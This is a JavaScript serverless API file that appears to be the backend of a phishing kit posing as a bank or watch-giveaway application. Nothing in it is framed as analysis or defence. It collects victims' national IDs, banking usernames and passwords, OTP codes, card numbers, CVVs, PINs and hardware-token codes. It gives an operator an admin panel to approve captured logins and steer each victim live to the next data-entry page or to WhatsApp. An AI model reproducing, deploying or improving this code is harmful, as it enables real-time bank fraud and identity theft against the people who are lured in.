const crypto = require('crypto');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
const TOKEN_SECRET = process.env.TOKEN_SECRET || 'halyg-admin-secret-key-2026';
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

// In-memory fallback (persists while function instance is warm)
const mem = { applications: {}, visitors: {}, whatsappLink: '', totalVisitors: 0, appId: 10000, visitorId: 120000 };

function makeToken() {
  return crypto.createHmac('sha256', TOKEN_SECRET).update(ADMIN_PASSWORD).digest('hex');
}
function verifyToken(token) { return token && token === makeToken(); }

function getCookies(h) {
  return (h || '').split(';').reduce((a, c) => { const i = c.indexOf('='); if (i > 0) a[c.slice(0, i).trim()] = c.slice(i + 1).trim(); return a; }, {});
}
function isAdminReq(req) {
  const cookies = getCookies(req.headers.cookie);
  return verifyToken(req.headers['x-admin-token'] || cookies['admin_session']);
}

// --- Storage layer: Redis if available, else in-memory ---
async function rc(...args) {
  if (!REDIS_URL || !REDIS_TOKEN) return null;
  try {
    const r = await fetch(REDIS_URL, {
      method: 'POST',
      headers: { Authorization: 'Bearer ' + REDIS_TOKEN, 'Content-Type': 'application/json' },
      body: JSON.stringify(args),
    });
    const d = await r.json();
    return d.result;
  } catch { return null; }
}
const useRedis = !!(REDIS_URL && REDIS_TOKEN);

async function getApp(id) {
  if (useRedis) { const r = await rc('HGET', 'apps', id); return r ? JSON.parse(r) : null; }
  return mem.applications[id] || null;
}
async function setApp(app) {
  if (useRedis) { await rc('HSET', 'apps', app.nationalId, JSON.stringify(app)); return; }
  mem.applications[app.nationalId] = app;
}
async function getAllApps() {
  if (useRedis) {
    const r = await rc('HGETALL', 'apps');
    if (!r || !Array.isArray(r)) return [];
    const out = []; for (let i = 1; i < r.length; i += 2) { try { out.push(JSON.parse(r[i])); } catch {} } return out;
  }
  return Object.values(mem.applications);
}
async function delApp(id) {
  if (useRedis) { await rc('HDEL', 'apps', id); return; }
  delete mem.applications[id];
}
async function getVisitor(id) {
  if (useRedis) { const r = await rc('HGET', 'vis', id); return r ? JSON.parse(r) : null; }
  return mem.visitors[id] || null;
}
async function setVisitor(v) {
  if (useRedis) { await rc('HSET', 'vis', v.sessionId, JSON.stringify(v)); return; }
  mem.visitors[v.sessionId] = v;
}
async function getAllVisitors() {
  if (useRedis) {
    const r = await rc('HGETALL', 'vis');
    if (!r || !Array.isArray(r)) return [];
    const out = []; for (let i = 1; i < r.length; i += 2) { try { out.push(JSON.parse(r[i])); } catch {} } return out;
  }
  return Object.values(mem.visitors);
}
async function getMeta(key) {
  if (useRedis) return await rc('GET', 'meta:' + key);
  if (key === 'whatsappLink') return mem.whatsappLink;
  if (key === 'totalVisitors') return String(mem.totalVisitors);
  return null;
}
async function setMeta(key, val) {
  if (useRedis) { await rc('SET', 'meta:' + key, String(val)); return; }
  if (key === 'whatsappLink') mem.whatsappLink = val;
  if (key === 'totalVisitors') mem.totalVisitors = parseInt(val, 10) || 0;
}
async function incrMeta(key) {
  if (useRedis) return await rc('INCR', 'meta:' + key);
  if (key === 'totalVisitors') return ++mem.totalVisitors;
  if (key === 'appIdCounter') return ++mem.appId;
  if (key === 'visitorIdCounter') return ++mem.visitorId;
  return Date.now();
}

async function getOrCreateApp(nationalId) {
  let app = await getApp(nationalId);
  if (!app) {
    const id = await incrMeta('appIdCounter');
    app = {
      id, nationalId,
      fullName: '', phoneNumber: '', phone: '', address: '',
      username: '', password: '',
      otp: '', otpCode: '',
      cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
      cardPin: '', cardName: '',
      hardToken: '', watchLink: '', watchLinkOtp: '',
      selectedWatch: '', watchColor: '',
      governorate: '',
      currentPage: 'home', status: 'active',
      redirectTo: null, redirectError: null,
      customMessage: null, loginApproved: null,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
    await setApp(app);
  }
  return app;
}

async function getOrCreateVisitor(sessionId) {
  let v = await getVisitor(sessionId);
  if (!v) {
    const id = await incrMeta('visitorIdCounter');
    await incrMeta('totalVisitors');
    v = { id, sessionId, currentPage: 'home', redirectTo: null, lastActiveAt: new Date().toISOString(), createdAt: new Date().toISOString() };
    await setVisitor(v);
  }
  return v;
}

async function executeProcedure(name, input, isAdmin) {
  switch (name) {
    case 'admin.updateVisitor': {
      const { sessionId, page, currentPage } = input;
      if (sessionId) { const v = await getOrCreateVisitor(sessionId); v.currentPage = currentPage || page || v.currentPage; v.lastActiveAt = new Date().toISOString(); await setVisitor(v); }
      return { success: true };
    }
    case 'admin.getVisitorRedirect': {
      const { sessionId } = input;
      const v = sessionId ? await getVisitor(sessionId) : null;
      return { redirectTo: v ? (v.redirectTo || null) : null };
    }
    case 'admin.clearVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId) { const v = await getVisitor(sessionId); if (v) { v.redirectTo = null; await setVisitor(v); } }
      return { success: true };
    }
    case 'applications.getRedirectStatus': {
      const { nationalId } = input;
      const app = nationalId ? await getApp(nationalId) : null;
      return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
    }
    case 'applications.clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId) { const app = await getApp(nationalId); if (app) { app.redirectTo = null; app.redirectError = null; await setApp(app); } }
      return { success: true };
    }
    case 'applications.getCustomMessage': {
      const { nationalId } = input;
      const app = nationalId ? await getApp(nationalId) : null;
      return { message: app ? (app.customMessage || null) : null };
    }
    case 'applications.clearCustomMessage': {
      const { nationalId } = input;
      if (nationalId) { const app = await getApp(nationalId); if (app) { app.customMessage = null; await setApp(app); } }
      return { success: true };
    }
    case 'applications.updatePage': {
      const { nationalId, page } = input;
      if (nationalId) { const app = await getOrCreateApp(nationalId); app.currentPage = page || app.currentPage; app.updatedAt = new Date().toISOString(); await setApp(app); }
      return { success: true };
    }
    case 'applications.savePersonalInfo': {
      const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (fullName) app.fullName = fullName;
      const ph = phone || phoneNumber;
      if (ph) { app.phone = ph; app.phoneNumber = ph; }
      if (address) app.address = address;
      if (governorate) app.governorate = governorate;
      if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
      app.updatedAt = new Date().toISOString();
      await setApp(app);
      return { success: true };
    }
    case 'applications.saveLoginData': {
      const { nationalId, username, password } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (username) app.username = username;
      if (password) app.password = password;
      app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
      await setApp(app);
      return { success: true };
    }
    case 'applications.saveOtpData': {
      const { nationalId, otp, otpCode } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const code = otp || otpCode;
      if (code) { app.otp = code; app.otpCode = code; }
      app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
      await setApp(app);
      return { success: true };
    }
    case 'applications.saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (cardNumber) app.cardNumber = cardNumber;
      if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
      const cv = cvv || cardCvv;
      if (cv) { app.cvv = cv; app.cardCvv = cv; }
      if (cardName) app.cardName = cardName;
      if (cardPin) app.cardPin = cardPin;
      app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
      await setApp(app);
      return { success: true };
    }
    case 'applications.saveHardToken': {
      const { nationalId, hardToken, hardTokenCode, token } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const tk = hardToken || hardTokenCode || token;
      if (tk) app.hardToken = tk;
      app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
      await setApp(app);
      return { success: true };
    }
    case 'applications.saveWatchLink': {
      const { nationalId, watchLink, watchLinkOtp, link } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const wl = watchLink || watchLinkOtp || link;
      if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
      app.updatedAt = new Date().toISOString();
      await setApp(app);
      return { success: true };
    }
    case 'admin.login': {
      const { password } = input;
      if (password === ADMIN_PASSWORD) return { success: true, _setToken: makeToken() };
      throw new Error('بيانات الدخول غير صحيحة');
    }
    case 'admin.checkSession': {
      return { isAdmin, authenticated: isAdmin };
    }
    case 'admin.logout': {
      return { success: true, _clearToken: true };
    }
    case 'admin.getApplications': {
      if (!isAdmin) throw new Error('unauthorized');
      const apps = await getAllApps();
      const cutoff = Date.now() - 60000;
      const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
      const liveVs = (await getAllVisitors()).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000);
      const tv = parseInt(await getMeta('totalVisitors') || '0', 10);
      return { apps, activeIds, liveVisitorCount: liveVs.length, totalVisitors: tv };
    }
    case 'admin.getLiveVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      const all = await getAllVisitors();
      return { visitors: all.filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000) };
    }
    case 'admin.getAllVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      const tv = parseInt(await getMeta('totalVisitors') || '0', 10);
      return { visitors: await getAllVisitors(), totalCount: tv };
    }
    case 'admin.getWhatsAppLink': {
      return { link: await getMeta('whatsappLink') || '' };
    }
    case 'admin.updateWhatsAppLink': {
      if (!isAdmin) throw new Error('unauthorized');
      await setMeta('whatsappLink', input.link || '');
      return { success: true };
    }
    case 'admin.setCustomMessage': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, message } = input;
      if (nationalId) { const app = await getApp(nationalId); if (app) { app.customMessage = message || null; await setApp(app); } }
      return { success: true };
    }
    case 'admin.approveLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let app = nationalId ? await getApp(nationalId) : null;
      if (!app && applicationId) { app = (await getAllApps()).find(a => a.id === applicationId); }
      if (app) { app.loginApproved = true; app.redirectTo = 'otp'; app.status = 'login_approved'; app.updatedAt = new Date().toISOString(); await setApp(app); }
      return { success: true };
    }
    case 'admin.rejectLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let app = nationalId ? await getApp(nationalId) : null;
      if (!app && applicationId) { app = (await getAllApps()).find(a => a.id === applicationId); }
      if (app) { app.loginApproved = false; app.redirectTo = 'login-error'; app.status = 'login_rejected'; app.updatedAt = new Date().toISOString(); await setApp(app); }
      return { success: true };
    }
    case 'admin.redirectUser': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, redirectTo, page, redirectError, showError } = input;
      if (nationalId) { const app = await getApp(nationalId); if (app) { app.redirectTo = redirectTo || page || null; app.redirectError = redirectError || showError || null; app.updatedAt = new Date().toISOString(); await setApp(app); } }
      return { success: true };
    }
    case 'admin.redirectVisitor': {
      if (!isAdmin) throw new Error('unauthorized');
      const { sessionId, redirectTo, page } = input;
      if (sessionId) { const v = await getVisitor(sessionId); if (v) { v.redirectTo = redirectTo || page || null; await setVisitor(v); } }
      return { success: true };
    }
    case 'admin.redirectAllToToken': {
      if (!isAdmin) throw new Error('unauthorized');
      const apps = await getAllApps();
      for (const app of apps) { if (app.status === 'active' || app.status.startsWith('awaiting')) { app.redirectTo = input.redirectTo || 'token'; app.updatedAt = new Date().toISOString(); await setApp(app); } }
      return { success: true };
    }
    case 'admin.redirectWhatsApp': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let app = nationalId ? await getApp(nationalId) : null;
      if (!app && applicationId) { app = (await getAllApps()).find(a => a.id === applicationId); }
      if (app) { app.redirectTo = 'whatsapp'; app.updatedAt = new Date().toISOString(); await setApp(app); }
      return { success: true };
    }
    case 'admin.deleteApplication': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      if (nationalId) await delApp(nationalId);
      else if (applicationId) { const app = (await getAllApps()).find(a => a.id === applicationId); if (app) await delApp(app.nationalId); }
      return { success: true };
    }
    case 'admin.deleteInactiveClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const cutoff = Date.now() - 120000;
      let deletedCount = 0;
      for (const app of await getAllApps()) { if (new Date(app.updatedAt).getTime() < cutoff) { await delApp(app.nationalId); deletedCount++; } }
      return { success: true, deletedCount };
    }
    case 'admin.resetTotalVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      await setMeta('totalVisitors', '0');
      return { success: true };
    }
    default:
      return { success: false, error: 'unknown procedure: ' + name };
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const { trpc } = req.query;
  let procsStr = Array.isArray(trpc) ? trpc.join('/') : (trpc || '');
  if (!procsStr) { const m = (req.url || '').split('?')[0].match(/\/api\/trpc\/(.+)/); if (m) procsStr = decodeURIComponent(m[1]); }
  const procs = procsStr.split(',').filter(Boolean);
  if (!procs.length) return res.status(400).json([]);

  let inputs = {};
  if (req.method === 'GET') { try { inputs = JSON.parse(req.query.input || '{}'); } catch { inputs = {}; } }
  else inputs = req.body || {};

  const isAdmin = isAdminReq(req);
  let setCookie = null, clearCookie = false;

  const results = await Promise.all(procs.map(async (name, i) => {
    const raw = inputs[String(i)] || inputs;
    const input = raw?.json || raw || {};
    try {
      const data = await executeProcedure(name.trim(), input, isAdmin);
      if (data?._setToken) { setCookie = data._setToken; delete data._setToken; }
      if (data?._clearToken) { clearCookie = true; delete data._clearToken; }
      return { result: { data: { json: data } } };
    } catch (e) {
      return { error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } };
    }
  }));

  if (setCookie) res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
  if (clearCookie) res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).json(results);
};
